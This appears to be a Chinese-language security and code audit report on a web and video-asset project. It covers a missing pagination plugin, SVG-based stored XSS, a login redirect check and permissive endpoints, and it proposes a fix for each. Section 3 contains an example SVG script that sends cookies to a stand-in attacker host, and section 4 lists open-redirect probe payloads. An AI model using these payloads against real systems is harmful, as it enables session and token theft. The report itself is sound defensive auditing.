## 1. [critical] MyBatis-Plus 分页插件从未注册 —— 所有列表端点返回全表

### 1.1 现象

全仓搜 `PaginationInnerInterceptor` / `MybatisPlusInterceptor`：**零命中**。

```
$ grep -rn "MybatisPlusInterceptor" backend/src/
（无输出）
$ grep -rn "PaginationInnerInterceptor" backend/src/
（无输出）
```

`backend/src/main/java/com/example/edam/config/` 下 7 个配置类
（`AsyncExecutorConfig` / `CurrentUserWebMvcConfig` / `FlywayMigrationGuard` /
`JacksonConfig` / `MinioConfig` / `MyMetaObjectHandler` / `RabbitConfig`）
**没有一个是 MyBatis-Plus 的**。`EdamApplication` 上也只有
`@MapperScan` / `@EnableAsync` / `@EnableScheduling`，没有装配插件。

### 1.2 为什么这会导致全表返回

MyBatis-Plus 的 `selectPage(IPage, Wrapper)` 在 3.5.7 里是这么实现的：

```
selectPage(P, Wrapper)
  → selectList(IPage, Wrapper)      // 带分页参数的那个重载
```

**但带分页参数的重载本身不做 LIMIT** —— LIMIT 是由
`PaginationInnerInterceptor` 在 SQL 拦截层改写出来的。
没有拦截器 ⇒ `selectPage` 退化成普通 `selectList` ⇒ **全表返回**。

### 1.3 实证（这是本篇最重要的一段）

光读代码不够，我写了一个最小复现，用 **H2 内存库 + 本仓库同一份
`mybatis-plus-extension-3.5.7.jar`**，对比"注册插件"与"不注册插件"两种情况：

```java
// 场景 A：不注册任何 InnerInterceptor（本项目现状）
var pageA = new Page<Demo>(1, 10);
var rA = mA.selectPage(pageA, new LambdaQueryWrapper<Demo>());
// → records=25  total=0     ← 库里 25 行，pageSize=10，全部返回

// 场景 B：注册 PaginationInnerInterceptor
cfg2.addInterceptor(mpi);   // mpi.setInterceptors(List.of(new PaginationInnerInterceptor()))
var pageB = new Page<Demo>(1, 10);
var rB = mB.selectPage(pageB, new LambdaQueryWrapper<Demo>());
// → records=10  total=25    ← 正确
```

（25 行是测试数据总量；`A` 返回 25 = 全表，`B` 返回 10 = 正确分页。）

再确认自动装配路径也不会"顺手"帮上忙 ——
反编译 `mybatis-plus-spring-boot-autoconfigure-3.5.7.jar`：

```
MybatisPlusInnerInterceptorAutoConfiguration
  @ConditionalOnMissingBean(MybatisPlusInterceptor.class)
  @Bean
  defaultMybatisPlusInterceptor(List<InnerInterceptor> interceptors)
```

`@ConditionalOnBean(InnerInterceptor.class)` 挂在方法上 ——
**只有当应用自己声明了至少一个 `InnerInterceptor` bean 时，这个 `@Bean` 才生效**。
本项目一个都没声明 ⇒ 这个 bean 不存在 ⇒ 分页插件彻底缺席。

用 Spring 的 `ApplicationContextRunner` 直接验：

```
ctx failed? null
MybatisPlusInterceptor bean = 0
Interceptor beans = 0
PaginationInnerInterceptor beans = 0
```

| --- | --- | --- |
| `VideoService.java:92` | `GET /videos` | 全表视频 |

| `DocumentService.java:88` | `GET /documents` | 全表文档 |

### 1.5 cursor 分页：唯一"静默出错"的一处

`VideoService.listByCursor`（`:118-140`）的注释写得很笃定：

```java
// MyBatis-Plus 3.5.7 的 last() 只有 last(boolean, String) 重载，
// **不支持参数化**，所以换用 Page 对象：selectPage 会生成参数化的
// `LIMIT ?, ?`（偏移固定 0，等价于 `LIMIT size`）。
```

**这段注释是错的** —— `selectPage` 在没有插件时根本不生成 LIMIT。

而这处的失败模式比别的更隐蔽：

```java
Page<VideoResource> page = new Page<>(1, limit + 1);
page.setSearchCount(false);
java.util.List<VideoResource> result = videoRepository.selectPage(page, wrapper).getRecords();
if (result.size() > limit) {
    return result.subList(0, limit);      // ← 手工截断救回来了
}
return result;
```

`subList(0, limit)` 把超出的部分切掉了 ⇒ **返回条数是对的**，
但数据库那边**已经把全表拉出来传到 JVM 内存了**。
所以 cursor 分页"看起来正常"，代价是每次请求都全表扫描 + 全量对象实例化。

⇒ 这是最坏的一种缺陷形态：**功能表现正常，资源消耗异常**，
监控上看不出来（响应条数正确），只有数据库慢查询日志能发现。

### 1.6 审计导出：内存放大 + 上限保护形同虚设

`AuditService.exportCsv`（`:283-296`）：

```java
Page<OperationLog> page = new Page<>(1, MAX_EXPORT_ROWS + 1);   // 50001
page.setSearchCount(false);
List<OperationLog> records = operationLogRepository.selectPage(page, wrapper).getRecords();
if (records.size() > MAX_EXPORT_ROWS) {
    throw new IllegalArgumentException("导出结果超过 " + MAX_EXPORT_ROWS + " 行，请缩小时间范围后再试");
}
```

这里的 `MAX_EXPORT_ROWS = 50_000` 上限**依赖 LIMIT 生效**。
没有 LIMIT ⇒ 一次性把**全部**审计日志拉进内存，然后才检查
`records.size() > 50000` ⇒ 抛错。

⇒ **上限保护触发时，内存已经被吃掉了**。
审计表是全系统增长最快的表（每个请求写一行）。
一次"导出全部审计"的请求 = 一次 OOM 风险。

这正好命中方案书 §14.3 Denial of Service（资源耗尽型）。

### 1.7 为什么三轮审计都没发现

- **CI 跑的是 `mvn test`，而后端测试全部连真 MySQL**（`application-test.yml`
  明确写了"用真 MySQL 而不是 H2"）。分页正确性需要断言
  `records.size() == pageSize`，**现在没有一条测试断言这个**。
- `PaginationResponsesTest` 只测响应壳的字段名，不碰数据量。
- 现有测试全部用 mock repository，`selectPage` 根本不执行 SQL。
- 人工点页面时，`GET /videos` 返回几十条视频看起来"正常" ——
  数据量小的时候，全表和分页返回的是同一批记录，**肉眼无法分辨**。

### 1.8 修复方案

新增 `backend/src/main/java/com/example/edam/config/MybatisPlusConfig.java`：

```java
package com.example.edam.config;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MybatisPlusConfig {

    /**
     * MyBatis-Plus 分页插件。
     *
     * <p><b>为什么必须有这个类</b>：
     * MP 的 {@code selectPage(IPage, Wrapper)} **本身不做 LIMIT** ——
     * LIMIT 是 {@link PaginationInnerInterceptor} 在 SQL 拦截层改写出来的。
     * 没有这个拦截器，{@code selectPage} 退化成普通 {@code selectList}：
     * <ul>
     *   <li>返回<b>全表</b>（不是当前页）</li>
     *   <li>{@code page.getTotal()} 恒为 0 ⇒ 前端分页器显示"共 0 条"</li>
     *   <li>所有 {@code page_size} 参数失效</li>
     * </ul>
     * 而且 MP 的自动装配（{@code MybatisPlusInnerInterceptorAutoConfiguration}）
     * 带 {@code @ConditionalOnBean(InnerInterceptor.class)} ——
     * <b>应用不自己声明 InnerInterceptor bean，它就不会被创建</b>。
     * 所以这个类必须显式写出来，不能指望 starter。
     *
     * <p>{@code maxLimit} 兜底：防止漏夹的 page_size 直接打到数据库。
     */
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        PaginationInnerInterceptor pagination = new PaginationInnerInterceptor(DbType.MYSQL);
        pagination.setMaxLimit(1000L);
        pagination.setOverflow(false);
        interceptor.setInterceptors(java.util.List.of(pagination));
        return interceptor;
    }
}
```

**顺带把 `page_size` 夹住**（现在几乎所有列表端点都没有夹）：

```java
// VideoService.list / DocumentService.list / AuditService.list / ...
int safeSize = Math.max(1, Math.min(pageSize, 100));
```

`maxLimit=1000` 是最后一道闸：即使某处忘了夹，SQL 也不会一次拉 100 万行。

### 1.9 配套回归测试（必须加）

## 2. [critical] iOS SDK 根本编译不过

### 2.1 现象

`mobile-sdk/ios/EDAMPlayer/EDAMPlayer.swift` 里有**两处语法错误**：

**错误一 —— 多了一个 `=`（`:124`）**：

```swift
public func stop() {
    avPlayer?.pause()
    avPlayerLayer = = nil        // ← `= =` 不是合法赋值
    ...
}
```

**错误二 —— `accessToken` 不在作用域内（`:178`）**：

```swift
private func setupPlayer(in container: UIView, session: PlaybackSession) {
    ...
    let asset = AVURLAsset(url: url, options: [
        "AVURLAssetHTTPHeaderFieldsKey": [
            "X-Session-Token": session.sessionId,
            "Authorization": "Bearer \(accessToken)"   // ← accessToken 未定义
        ]
    ])
```

`accessToken` 是 `play(in:videoId:accessToken:)`（`:97`）的参数，
但 `setupPlayer` 的签名里没有它 ⇒ **编译期 "cannot find 'accessToken' in scope"**。

⇒ **这个文件一行都编译不过** ⇒ 整个 `EDAMPlayer` target 编译失败
⇒ Swift Package 的 `EDAMPlayer` 库根本产不出来。

### 2.2 第三处：`Package.swift` 指向不存在的目录

```swift
.testTarget(
    name: "EDAMPlayerTests",
    dependencies: ["EDAMPlayer"],
    path: "EDAMPlayerTests"          // ← 这个目录不存在
),
```

实测 `mobile-sdk/ios/` 下只有 `EDAMPlayer/` 和 `Package.swift`，
**没有 `EDAMPlayerTests/`**。

⇒ `swift build` 会直接报
`error: Source files for target EDAMPlayerTests should be located under 'EDAMPlayerTests'`
—— **即使修好了 §2.1 的两处语法错误，Package 依然构建不出来**。

### 2.3 为什么能潜伏这么久

**CI 里根本没有 mobile-sdk**：

```
$ grep -rn "swift\|xcode\|gradle\|android" .github/workflows/ .gitlab-ci.yml
（无输出）
```

后端 / 前端 / Worker 三个 CI job 都在跑，唯独移动端 SDK
**没有任何编译检查**。这个仓库里 iOS SDK 是唯一"写了但从不构建"的东西。

### 2.4 修复方案

**① `EDAMPlayer.swift:124`**：

```swift
avPlayerLayer = nil
```

**② `EDAMPlayer.swift:160`** —— 把 `accessToken` 传进去：

```swift
private func setupPlayer(in container: UIView, session: PlaybackSession, accessToken: String) {
```

调用处（`:107`）同步改：

```swift
self.setupPlayer(in: container, session: session, accessToken: accessToken)
```

> ⚠️ 更彻底的做法是**不要把登录 JWT 塞进 AVURLAsset 的 HTTP 头** ——
> 播放用的应该是后端 `/playback/{id}/token` 签发的
> **播放 token**（带 `scope=playback` + `video_id` 绑定），
> 也就是 `session.m3u8Url` 里那个 `?token=`。
> 后端的 `PlaybackSession` 里已经有 `token` 字段（`:570`），
> **但 `setupPlayer` 压根没用它** ⇒ 又是一处"字段在、没接线"。

**③ `Package.swift`** —— 二选一：

- 建 `mobile-sdk/ios/EDAMPlayerTests/` 目录 + 一个冒烟测试；**或者**
- 删掉那个 `testTarget`（当前一个测试都没有，删了不影响任何东西）。

**④ CI 加一道 mobile 编译门**（这是最关键的一步）——
没有这一步，上面三条改完照样会烂掉：

```yaml
  mobile-sdk:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build iOS SDK
        run: swift build --package-path mobile-sdk/ios
```

Android 侧同理（`./gradlew :edam-player:assembleRelease`）。
**macos runner 比 Linux 贵，但 iOS SDK 只能这么验** ——
如果不想加 macos runner，最起码要加 **`swiftc -parse`** 之类的语法检查，
但那需要 macOS 工具链。退一步的办法：**至少把 iOS SDK 的关键文件
纳入人工评审清单，并在 README 里标注"未在 CI 编译"**。

## 3. [high] SVG 文档可以绕过白名单，落地存储型 XSS

### 3.1 现象

`DocumentController.isAllowedDocumentType`（`:170-190`）的白名单：

```java
if (contentType != null) {
    String c = contentType.toLowerCase();
    if (c.contains("officedocument") || c.contains("pdf") ||
        c.contains("image/") || c.contains("msword") ||
        c.contains("excel") || c.contains("powerpoint")) {
        return true;
    }
}
```

`c.contains("image/")` 匹配 **`image/svg+xml`** ✓
后缀白名单里没有 `.svg`，但 MIME 分支已经放行了。

`DocumentService.detectFileType`（`:263-273`）对 `.svg` 的处理：

```java
if (lower.endsWith(".png") || lower.endsWith(".jpg") || ...) return "image";
return "docx";          // ← .svg 落到这里
```

⇒ `.svg` 文件被当成 docx 处理，但**落库的 MIME 是客户端给的那个**：

```java
doc.setMimeType(file.getContentType());   // DocumentService.java:167
```

⇒ 库里 `mime_type = "image/svg+xml"`。

### 3.2 预览时怎么变成 XSS

`DocumentPreviewService.load`（`:103-107`）：

```java
String mime = doc.getMimeType() != null ? doc.getMimeType() : "application/octet-stream";
boolean inline = mime.startsWith("application/pdf") || mime.startsWith("image/")
                || mime.startsWith("text/");
```

`image/svg+xml` ⇒ `inline = true`。

`DocumentController.preview`（`:258-262`）：

```java
response.setContentType(content.mime());        // image/svg+xml
response.setHeader(HttpHeaders.CONTENT_DISPOSITION,
    DocumentPreviewService.contentDisposition(content.inline(), content.filename()));
```

⇒ 浏览器收到 `Content-Type: image/svg+xml` + `Content-Disposition: inline`
⇒ **直接内联渲染 SVG**。

而 SVG 里可以放 `<script>`：

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
</svg>
```

⇒ 攻击者上传一个 SVG 文档，任何有 preview 权限的人打开
`GET /documents/{id}/preview` ⇒ **脚本在该用户浏览器里执行**。

### 3.3 为什么 `X-Content-Type-Options: nosniff` 挡不住

`DocumentPreviewService.applySecurityHeaders`（`:156-161`）确实设了 nosniff：

```java
response.setHeader("X-Content-Type-Options", "nosniff");
```

但 nosniff 挡的是"**声明类型与实际不符时禁止嗅探**"。
这里声明的就是 `image/svg+xml` —— 浏览器**按 SVG 渲染**，nosniff 帮不上忙。
（它甚至会帮倒忙：`nosniff` + `image/svg+xml` 是浏览器明确会当作活动内容执行的类型。）

### 3.4 水印也挡不住

`WatermarkService.applyWatermark`（`:159-173`）：

```java
if (m.startsWith("image/png") || m.startsWith("image/jpeg") ||
    m.startsWith("image/jpg") || m.startsWith("image/webp")) {
    return watermarkImage(in, mimeType, employeeNo);
}
return in.readAllBytes();      // ← svg 落到这里，原样返回
```

⇒ SVG **既不会被栅格化掉脚本，也不会被打上水印**。
水印层 + 脚本层一起送到用户浏览器。

### 3.5 失败场景

普通员工（`employee` 角色）有 `document:read` ⇒ 有 preview 权限。
攻击路径：

1. 攻击者（有 `document:upload`）上传 `payload.svg`，
   `Content-Type: image/svg+xml`，内容含 `<script>`
2. 攻击者把该文档分享给受害者（`view` 位即可）
3. 受害者打开预览 ⇒ 脚本在**后端域名**下执行
4. 受害者浏览器里有 `access_token` / `refresh_token`（`stores/user.ts:9-10`
   存在 localStorage）⇒ **XSS 直接偷走 JWT**

⇒ 这条链比一般的存储型 XSS 严重，因为它落在**持有令牌的认证域**上。

### 3.6 修复方案

**三处都要改，缺一不可**：

**① 上传白名单排除 SVG**（`DocumentController.isAllowedDocumentType`）：

```java
// SVG 可以带 <script>，不能当图片放行
if (c.contains("image/") && !c.contains("svg")) { ... }
```

后缀白名单同样补一条 `&& !f.endsWith(".svg")`。

**② MIME 由服务端判定，不信客户端**（`DocumentService.persistAndPublish`）：

```java
// 落库的 MIME 用服务端按内容嗅探出来的，不信客户端的 Content-Type
doc.setMimeType(sniffMime(file.getBytes(), fileType));
```

或者至少：落库时把 `image/svg+xml` 归一成 `application/octet-stream`。

**③ 预览时对 SVG 一律 `attachment`**（`DocumentPreviewService.load`）：

```java
boolean inline = (mime.startsWith("application/pdf") || mime.startsWith("image/")
                || mime.startsWith("text/"))
                && !mime.contains("svg");        // ← 加这一条
```

**更彻底的做法**：`inline` 的白名单改成**精确枚举**
（`application/pdf` / `image/png` / `image/jpeg` / `image/gif` / `image/webp`），
其余一律 `attachment` + `application/octet-stream`。
白名单用"包含"匹配是这类漏洞的通用成因。

### 3.7 顺带发现的同源问题

`DocumentPreviewService.contentDisposition`（`:144-149`）：

```java
String encoded = java.net.URLEncoder.encode(filename, StandardCharsets.UTF_8)
    .replace("+", "%20");
return (inline ? "inline" : "attachment")
    + "; filename=\"" + encoded + "\"; filename*=UTF-8''" + encoded;
```

`URLEncoder.encode` 会把 `"` 编码成 `%22` ⇒ **这里没有 header 注入**，
✅ 这一点是对的（我一开始怀疑过，查了编码行为后确认没问题）。

## 4. [low] 登录后的 `redirect` 参数未做站内校验（当前不构成开放重定向）

> ⚠️ **本条在起草时被我判定为 [high]「开放重定向」，写完实测后自我推翻了。**
> 下面保留完整的实测数据，因为"测过但没发现问题"和"没测过"是两回事，
> 下轮不必重跑。

### 4.1 现象

`web/src/views/Login.vue:47-48`：

```js
const redirect = (route.query.redirect as string) || '/';
router.push(redirect);
```

`redirect` 来自 URL query，**没有任何站内性校验**。

### 4.2 实测结论：**当前版本 vue-router 不产生跨站跳转**

用项目里正在用的 `vue-router@4.6.4` 写了一组 payload 探测
（`router.push` + `createWebHistory`，逐个看 `window.location.href`）：

```
same-origin payload="//evil.com"                        -> http://localhost:3000//evil.com
same-origin payload="/\evil.com"                        -> http://localhost:3000/evil.com
same-origin payload="\/evil.com"                        -> http://localhost:3000/evil.com
same-origin payload="https://evil.com"                  -> http://localhost:3000/https://evil.com
same-origin payload="//evil.com/path?x=1"               -> http://localhost:3000//evil.com/path?x=1
same-origin payload="http://evil.com"                   -> http://localhost:3000//evil.com/http://evil.com
same-origin payload="///evil.com"                       -> http://localhost:3000///evil.com
same-origin payload="//evil.com:80"                     -> http://localhost:3000//evil.com:80
same-origin payload="javascript:alert(1)"               -> http://localhost:3000//javascript:alert(1)
same-origin payload="data:text/html,<script>alert(1)"   -> http://localhost:3000//data:text/html,%3Cscript%3Ealert(1)%3C/script%3E
```

⇒ **11 种 payload 全部留在原域**，没有一个能跳出去。

原因在 vue-router 的 `useHistoryStateNavigation.changeLocation`（`:113-133`）：

```js
const url = hashIndex > -1 ? ... : createBaseLocation() + base + to;
history$1[replace$1 ? "replaceState" : "pushState"](state, "", url);
```

`createBaseLocation()` = `location.protocol + "//" + location.host`
⇒ pushState 的目标**始终带自己的 origin**，协议相对 payload 只是变成了路径。

另外 `https://evil.com` 被 `parseURL` 相对化成 `/https://evil.com` ⇒ 也是站内。

### 4.3 为什么仍然值得记一条

**① `redirect` 的唯一来源是站内路径，但代码没设防。**

全仓搜 `redirect` 的写入点，只有两处，都在 `router/index.ts`：

```js
return next({ name: 'Login', query: { redirect: to.fullPath } });   // :98
.catch(() => next({ name: 'Login', query: { redirect: to.fullPath } })); // :117
```

`to.fullPath` 天然是站内路径 ⇒ **当前不可能被投毒**。

但这是**巧合，不是设计** —— `Login.vue` 对 `query.redirect` 零校验，
任何人只要给 `Login.vue` 加一行"从别处接收 redirect"（比如从
SSO 回跳、from 参数、sessionStorage 取），立刻就是一个开放重定向。

**② 依赖了 vue-router 的内部行为，而 vue-router 自己认为这是非法用法。**

```
[Vue Router warn]: Location "//evil.com" resolved to "//evil.com".
A resolved location cannot start with multiple slashes.
```

它**只是 warn，不是 throw**。风险点：

- vue-router 升级改了 `createHref` / `createBaseLocation` 策略
- `createWebHistory` 的 base 一旦配错（比如 base 设为 `''` 而非 `'/'`），
  `createBaseLocation() + base + to` 的拼接结果就可能变成协议相对 URL
- 前端现在**没有**任何 `window.location.href = redirect` 的写法
  （全仓只有 `utils/session.ts:54` 的 `window.location.href = '/login'`，是硬编码站内路径），
  但一次"重构时改成原生跳转以支持新窗口"就会立刻变成漏洞

⇒ **这是一个"此刻不构成漏洞、但把不变量外包给了第三方库 + 一行代码"的形状**。
在防泄密系统里，这个不变量应该由**本项目自己**守住。

### 4.4 修复方案（一行，零风险）

`Login.vue`：

```js
// 只允许站内路径：以单个 / 开头，且不是协议相对 URL（//）
const raw = route.query.redirect as string | undefined
const redirect = raw && /^\/(?!\/)/.test(raw) ? raw : '/'
router.push(redirect)
```

`/^\/(?!\/)/` 同时挡掉：
- `//evil.com`（协议相对）
- `/\evil.com`（部分浏览器把 `\` 当 `/`）
- `https://evil.com`（绝对 URL）

**更稳的做法**：不用 query 传 redirect，改成**路由 name + params**，
或者只允许一个白名单内的路径集合。

### 4.5 顺带核过的：**没有** XSS 注入点

`web/src/` 全仓搜 `v-html` / `innerHTML`：

```
$ grep -rn "v-html\|innerHTML" web/src/
web/src/utils/permission.spec.ts:43:    document.body.innerHTML = '';   ← 测试里清空 DOM
```

⇒ 生产代码里**没有** `v-html`，也没有 `innerHTML` 赋值。✅

## 6. 已核过：列表可见性与详情可见性**判定一致**（起草时误判为缺陷）

> ⚠️ **本条在起草时被我写成 [medium]「可见性判定不一致」，
> 写完把 `canView` 的完整实现逐行读出来后发现是我看错了，已推翻。**
> 保留这一节是因为"核过且一致"是有价值的结论 ——
> 它标明了列表端点与详情端点的可见性语义**没有漂移**。

### 6.1 两个实现的实际内容

**详情端点 —— `VideoPermissionService.canView`（`:192-213`）**：

```java
public boolean canView(VideoResource video, Long userId) {
    if (video == null || userId == null) return false;
    if (CurrentUser.isAdmin()) return true;                        // ① admin
    if (userId.equals(video.getUploaderId())) return true;         // ② 上传者
    if ((effectiveActions(video.getId(), userId) & ACTION_VIEW) != 0) return true;  // ③ 显式授权
    Integer lv = video.getClassificationLv();
    if (lv == null || lv <= 2) return true;                        // ④ L1/L2
    if (lv == LEVEL_L3) return sameDepartment(video.getUploaderId(), userId);  // ⑤ L3 同部门
    return false;                                                  // ⑥ L4 拒绝
}
```

**列表端点 —— `VideoPermissionService.applyVisibility`（`:285-295`）**：

```java
wrapper.and(w -> {
    w.eq(VideoResource::getUploaderId, userId)              // ② 上传者
     .or().le(VideoResource::getClassificationLv, 2);       // ④ L1/L2
    if (!grantedIds.isEmpty()) {
        w.or().in(VideoResource::getId, grantedIds);        // ③ 显式授权（view 位且未过期）
    }
    if (!deptUploaderIds.isEmpty()) {
        w.or().and(x -> x.eq(VideoResource::getClassificationLv, LEVEL_L3)  // ⑤ L3
                                  .in(VideoResource::getUploaderId, deptUploaderIds));
    }
});
// ① admin 在方法开头直接 return（不拼任何条件）
// ⑥ L4 不进任何分支 ⇒ 被排除
```

### 6.2 逐条对照结论：一致

| 判定 | `canView`（详情） | `applyVisibility`（列表） | 一致？ |
| --- | --- | --- | --- |
| admin | 直接 return true | 方法开头 `if (CurrentUser.isAdmin()) return;`（不加条件） | ✅ |
| 上传者本人 | `uploaderId == userId` | `eq(uploaderId, userId)` | ✅ |
| 显式授权（view 位 + 未过期） | `effectiveActions & ACTION_VIEW` | `grantedIds` 集合（同样过滤 `isExpired` 和 `ACTION_VIEW` 位） | ✅ |
| L1 / L2 | `lv <= 2` | `le(classificationLv, 2)` | ✅ |
| L3 同部门 | `lv == LEVEL_L3 && sameDepartment(...)` | `classificationLv == LEVEL_L3 && uploaderId in deptUploaderIds` | ✅ |
| L4 | `return false` | 不进任何分支 | ✅ |

`applyVisibility` 的注释自己也写明了这条不变量：

> "可见性过滤（密级 + 显式授权）—— 与 `VideoPermissionService.canView` 同源。
> 不加这个的话，列表里会出现根本点不开的视频（L3/L4 未授权时播放会 403），
> 用户只能看到"列表里有、点进去报没权限"，体验上等于没做鉴权。"

⇒ **没有"列表里看不到但 URL 能打开"的漏洞，也没有反向的。**

### 6.3 文档侧同样核过

`DocPermissionService.canView`（`:179-200`）与
`DocPermissionService.applyVisibility`（`:275-285`）是同构的一对，
判定顺序逐条对应，**同样一致**。

### 6.4 但有一个**结构性**隐患（不是本条的缺陷，是给下一轮的提醒）

可见性判定现在有 **4 份实现**：

```
VideoPermissionService.canView
VideoPermissionService.applyVisibility
DocPermissionService.canView
DocPermissionService.applyVisibility
```

两两同构，**任何一条改动都要同步 4 处**。
而它们之间**没有任何共享代码**（只有 `applyVisibility` 靠注释提醒）。

⇒ 一旦有人只改其中一处（很容易），
就会出现"列表里有、点进去 403"或"列表里没有、URL 能开"的漂移 ——
**当前四份是一致的，但没有任何机制保证它们继续一致**。

建议（不急，属于重构）：
抽一个共享的可见性判定器，视频侧和文档侧各自传"资源类型"，
让 `canView` 和 `applyVisibility` 都基于同一份规则生成 ——
这跟项目已有的 `ClassificationEnforcement` 是同一个思路，
也符合 CLAUDE.md 里"权限是数据不是代码"的取向。

## 7. [medium] `SecurityConfig` 里 worker 回调端点是 `permitAll`

（§5.5 最后一行展开）

```java
.requestMatchers(HttpMethod.PATCH, "/videos/*/status").permitAll()
.requestMatchers(HttpMethod.PATCH, "/documents/*/status").permitAll()
```

当前**方法内**有 `X-Worker-Token` 校验，所以现在是安全的。

但这两行 + 下面几行构成了一个"**危险形状**"：

```java
.requestMatchers(HttpMethod.GET, "/playback/*/playlist.m3u8").permitAll()
.requestMatchers(HttpMethod.GET, "/playback/*/segment/*").permitAll()
.requestMatchers(HttpMethod.GET, "/playback/*/key").permitAll()
```

⇒ **一共 5 个 permitAll 端点，每一个的安全性都 100% 依赖 Controller 方法内部
的一行校验**。任何一次"在这个端点前面加个分支"的重构，都可能静默地
把一个内部端点变成裸奔端点。

⇒ 建议：Spring Security 层改成 `.authenticated()`，
把 worker-token / playback-token 的校验**收口到一处**（Spring Security 的
`RequestHeaderAuthenticationFilter` 或自定义 `AuthenticationProvider`），
而不是散落在 5 个 Controller 方法里。

同样的问题在 `playback/*` 那三个端点上更危险 —— 它们是
**未授权投递的任意对象读链**，只要有一处漏判就是全量资产泄露。
